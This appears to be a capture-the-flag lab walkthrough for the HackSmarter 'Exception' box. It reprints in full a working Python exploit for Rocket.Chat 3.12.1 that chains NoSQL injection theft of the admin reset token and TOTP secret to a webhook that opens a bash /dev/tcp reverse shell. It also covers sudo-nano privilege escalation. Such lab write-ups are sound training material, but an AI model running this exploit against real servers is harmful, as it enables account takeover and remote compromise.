---
title: "HackSmarter Exception Walkthrough (Medium) "
date: 2026-05-17 00:00:00 +0000
categories: [ HackSmarter]
tags: [Hacksmarterlabs , Linux , Medium]
---



## Scenario : 

As part of an internal penetration test, you have discovered a server handling sensitive corporate communications. Compromising this high-value target is key to demonstrating tangible risk to the client. Conduct a full-scope penetration test against the target IP to identify, exploit, and report on any existing vulnerabilities.


## Solution : 


### Enumeration : 

First thing , we start with an nmap scan : 

<img width="1143" height="665" alt="image" src="https://github.com/user-attachments/assets/c2ec7132-8de7-49a5-a1c0-501d3588d83a" />

Iniatial Scan returns 3 ports , 22 for SSH , 80 and 3000 for a web app running on the server , for port 80 we didn't really get anything useful just  a chat bot we can interact with , tried Fuzzing for directories , files , subdomains but didn't get anything . 

<img width="1089" height="647" alt="image" src="https://github.com/user-attachments/assets/89efda05-fbda-458f-8554-a50a6e2b7016" />


For the port 3000 , i found something called Rocket Chat : 

<img width="1304" height="794" alt="image" src="https://github.com/user-attachments/assets/64c226fd-fa4c-48a5-89cd-fb1e177a4b24" />


After looking it up it is apparently a chatting app , i registered an account to try and enuumerate the app further .  


<img width="1415" height="722" alt="image" src="https://github.com/user-attachments/assets/775217bc-ebe8-45af-8098-121b04180f4d" />


We find this admin email once we're logged in , we will note this as we might need it for later .  

I first tried Fuzzing for files , directories but got nothing , but after taking a look at what Burp crawled , we find an interesting endpoint : /api/info , which reveals the version of this Rocket Chat being used . 


<img width="1548" height="659" alt="image" src="https://github.com/user-attachments/assets/1be44095-87ed-4fd8-97f0-61316ca1b6be" />


Now a quick google search , we see that this version is vulnerable to a NoSQL Injection where we are able to change the password of the admin's email . Looking at Hack Tricks i found that once we can login as Admin on Rocket Chat app we are able to get an RCE easily by generating a Web Hook . 

<img width="1052" height="816" alt="image" src="https://github.com/user-attachments/assets/a14c2730-2e5a-466c-94e9-e7554a88109c" />


### Exploitation 

Luckily for us the exploits for this version will do the RCE step for us , i found this one of exploit DB 

```bash
https://www.exploit-db.com/exploits/49960
```

For this exploit to work , we only need the admin's email address and a low level user email which will be ours , we already got the admin's email right after we logged in . 

```bash
Admin User : localh0ste@exception.local
Low level user :  bbb@gmail.com 
```
Now copy the exploit , create a virtual python environment to be able to install the dependencies : 


```bash
python3 -m venv venv
source venv/bin/activate
pip install <package>
```

Finally to run the exploit we just need to give both emails and the URL : 

```bash
python3 exploit.py -t http://10.0.22.210:3000 -a localh0ste@exception.local -u bbb@gmail.com 
```
<img width="1283" height="706" alt="image" src="https://github.com/user-attachments/assets/a4b79105-601f-419d-b80f-8bf99f53a60b" />

This exploit unfortunately didn't work, since it tried brute forcing the password reset token via blind NoSQL injection, which is slow and the token expires before it can be used. After some research I found this version from **syk0.dev** which fixes this issue by using our already authenticated low priv session with a NoSQL injection to instantly extract the admin reset token.

```bash
import requests
import string
import time
import hashlib
import json
import oathtool
import argparse
import time
import mintotp
 
 
proxies = {
    "http": "127.0.0.1:8080",
    "https": "127.0.0.1:8080"
}
 
 
def login_as_admin(url, email, password, totp):
    sha256pass = hashlib.sha256(bytes(password, encoding='utf8')).hexdigest()
    payload = json.dumps({"message": json.dumps({
        "msg": "method", "method": "login",
        "params": [{"totp": {"login": {"user": {"username": email},
                             "password": {"digest": sha256pass, "algorithm": "sha-256"}},
                             "code": totp}}]})})
 
    headers={'content-type': 'application/json'}
    r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False, proxies=proxies)
    if "error" in r.text:
        exit("[-] Couldn't authenticate")
    temp = json.loads(r.text)
    data = json.loads(temp['message'])
    userid = data['result']['id']
    token = data['result']['token']
 
    return (userid, token)
 
def get_token_id(email, url, password):
    sha256pass = hashlib.sha256(bytes(password, encoding='utf8')).hexdigest()
    payload ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+email+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
    headers={'content-type': 'application/json'}
    r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False, proxies=proxies)
    if "error" in r.text:
        exit("[-] Couldn't authenticate")
    temp = json.loads(r.text)
    data = json.loads(temp['message'])
    userid = data['result']['id']
    token = data['result']['token']
 
    return (userid, token)
 
 
def create_user(url, email, password):
    username = email.split('@')[0]
    payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"registerUser\\",\\"params\\":[{\\"name\\":\\"'+ username +'\\",\\"email\\":\\"'+email+'\\",\\"pass\\":\\"'+ password +'\\",\\"confirm-pass\\":\\"'+ password +'\\"}],\\"id\\":\\"30\\"}"}'
    headers={'content-type': 'application/json'}
    r = requests.post(url+"/api/v1/method.callAnon/registerUser", data = payload, headers = headers, verify = False, allow_redirects = False, proxies=proxies)
    temp = json.loads(r.text)
    data = json.loads(temp['message'])
    if 'Email already exists' in r.text:
        print(f'[+] User: {email} exists')
        tokenData = get_token_id(email, url, password)
        return tokenData
    else:
        print(f"[+] {email} does not exist")
        userid = data['result']
        print("[+] Low Privilege User Created")
        print(f"[+] Username: {email}\n[+] Password: {password}")        
        tokenData = get_token_id(email,url,password)        
        return tokenData
 
 
def forgotpassword(url, admin_email):
    payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+admin_email+'\\"]}"}'
    headers={'content-type': 'application/json'}
    r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = payload, headers = headers, verify = False, allow_redirects = False, proxies=proxies)
    print("[+] Password Reset Email Sent")
 
 
def get_pass_reset_token(url, admin_user, low_user_id, low_user_token):
    cookies = {'rc_uid': low_user_id,'rc_token': low_user_token}
    headers={'X-User-Id': low_user_id,'X-Auth-Token': low_user_token}
    payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\''+admin_user+'\'+%26%26+(()%3d>{+throw+this.services.password.reset.token+})()"}'
    re = requests.get(url+payload,cookies=cookies,headers=headers, proxies=proxies)    
    if re.status_code == 400:
        d = json.loads(re.text)
        token = d['error'].replace('uncaught exception: ', '') 
        print(f"[+] Password Reset Token {token}")
        return token
 
 
def get_totp_token(url, admin_user, low_user_id, low_user_token):
    cookies = {'rc_uid': low_user_id,'rc_token': low_user_token}
    headers={'X-User-Id': low_user_id,'X-Auth-Token': low_user_token}
    payload = '/api/v1/users.list?query={"$where"%3a"this.username%3d%3d%3d\''+admin_user+'\'+%26%26+(()%3d>{+throw+this.services.totp.secret+})()"}'
    re = requests.get(url+payload,cookies=cookies,headers=headers, proxies=proxies)    
    if re.status_code == 400:
        d = json.loads(re.text)
        token = d['error'].replace('uncaught exception: ', '') 
        print(f"[+] TOTP {token}")
        return token
 
 
def change_admin_password(url, totp, pass_reset_token, password):       
    
    payload = json.dumps({"message": json.dumps({
        "msg": "method", "method": "resetPassword",
        "params": [pass_reset_token, password, {"twoFactorCode": totp, "twoFactorMethod": "totp"}]})})
 
    print(payload)
    headers={'content-type': 'application/json'}
    r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False, proxies=proxies)            
    print(f"\n[+] Password was changed to {password}")
 
 
def rce(url, admin_user, a_id, a_token, ip, port):    
    # Creating Integration
    payload = '{"enabled":true,"channel":"#general","username":"'+admin_user+'","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true, "script": "class Script {\\n\\n  process_incoming_request({ request }) {\\n\\n\\tconst require = console.log.constructor(\'return process.mainModule.require\')();\\n\\tconst { exec } = require(\'child_process\');\\n\\texec(\'bash -c \\\"bash -i >& /dev/tcp/' + str(ip) + '/' + str(port) + ' 0>&1\\\"\');\\n\\t}\\n}","type":"webhook-incoming"}'
    cookies = {'rc_uid': a_id,'rc_token': a_token}
    headers = {'X-User-Id': a_id,'X-Auth-Token': a_token}
    r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload, proxies=proxies)
    data = json.loads(r.text)
 
    token = data['integration']['token']
    _id = data['integration']['_id']
    print('[+] Sending Reverse Shell Integration')
    # Triggering RCE
    u = url + '/hooks/' + _id + '/' +token
    r = requests.get(u)
    if 'success' in r.text:
        print(f'[+] Shell for {ip}:{port} Has Executed!')
    else:
        print('[-] Error')
 
 
def main():
    parser = argparse.ArgumentParser(description='RocketChat 3.12.1 RCE')
    parser.add_argument('-u', help='Low Privilege Email (If this user does not exist, it will be created)', required=True)
    parser.add_argument('-a', help='Admin Email Address', required=False)
    parser.add_argument('-H', help='URL (Eg: http://rocketchat.local)', required=True)
    parser.add_argument('-p', help='Set passwords for accounts', required=False)
    parser.add_argument('--ip', help='Your Listener IP', required=False)
    parser.add_argument('--port', help='Your Listener Port', required=False)
 
    parser.set_defaults(reset=False)
    args = parser.parse_args()
 
 
    admin = args.a
    user = args.u
    target = args.H
    ip = args.ip
    port = args.port
    if args.p == None:
        password = 'syk0'
    else:
        password = args.p
 
 
    admin_user = admin.split('@')[0]
    
    low_user = create_user(target, user, password)
    print(low_user)
   
    # get TOTP for admin 
    totp = get_totp_token(target, admin_user, low_user[0], low_user[1])
 
     # trigger forgot password function for admin
    forgotpassword(target, admin)
    
    # get pass reset from admin
    pass_reset_token = get_pass_reset_token(target, admin_user, low_user[0], low_user[1])
 
    change_admin_password(target, mintotp.totp(totp), pass_reset_token, password)
 
    a_user = login_as_admin(target, admin_user, password, mintotp.totp(totp))
 
    rce(target, admin_user, a_user[0], a_user[1], ip, port)
 
main()

```

Now all we need to do is setup our listener to catch the shell (This exxploit uses a Proxy so make sure you have Burp running otherwise remove the Proxy part in the code ) :

<img width="1918" height="920" alt="image" src="https://github.com/user-attachments/assets/6fd6c042-562a-4d23-b0b8-5613472ad91c" />


Perfect , now that we got our shell we can start enumerating the system further to check for Privesc vectors . 

### Privilege Escalation : 

First thing we find is the Backups file which contains some creds , we can use them to Login via SSH . 

<img width="736" height="799" alt="image" src="https://github.com/user-attachments/assets/b7bdb4b2-f931-4a94-bbc8-9affa5bac978" />


As soon as we login via SSH , we get the user flag : 


<img width="811" height="340" alt="image" src="https://github.com/user-attachments/assets/1bd01201-9653-4e63-8ea7-00b9773786c7" />


Before using Linpeas for privesc i like to do some manual checks , here is a quick checklist : 

```bash
id : Check for Groups and Which user . 
cat /etc/passwd : Check other users on the machine . 
sudo -l : which prog can be ran with root perm . 
uname -sr / lsb_relase -a : Version + architecture .  
find / -type f -perm -04000 -ls 2>/dev/null : Find binaries with SUID . 
Check for Bash History . 
If we can Write into a file and execute it as anOTher user , always put a RevShell there .
If you get Creds always test for password Reuse . 
cat /etc/fstab : if there is an nfs . 
sudo -V : check sudo version for privesc .
```
<img width="1287" height="383" alt="image" src="https://github.com/user-attachments/assets/d7e5d76d-cae4-4703-97c9-c9010738bbba" />

We see that our user is able to execute the check_log --clean as Root without password , let's check GTFOBINS to see if there is a way to abuse this to get Root , We find File read and write but for check_log binary , but if we try it we get the error that our user cant run this binary as root . 

But if we run the binary normally , we get dropped into a Nano editor , we know that nano can be abused to achieve Root if we can execute it with root privileges . 


<img width="1190" height="896" alt="image" src="https://github.com/user-attachments/assets/fb17b1d0-8313-4982-99b8-a2786bf11b33" />

Checking GTFOBINS : 


<img width="1132" height="824" alt="image" src="https://github.com/user-attachments/assets/5241a762-0a3a-44ae-974d-0f3fc0529957" />

Now first CRTL R + CTRL X then we type the command : 

<img width="664" height="864" alt="image" src="https://github.com/user-attachments/assets/0c66d885-a542-4a30-8236-3c23b12b098e" />

Once we execute it , we get Root access , and from there we can read the Flag in the Root Directory : 

<img width="1207" height="492" alt="image" src="https://github.com/user-attachments/assets/211a2784-fcf1-4f3f-b658-ff34e4ea0d79" />


That's all for this Box , see you in the next one :) 


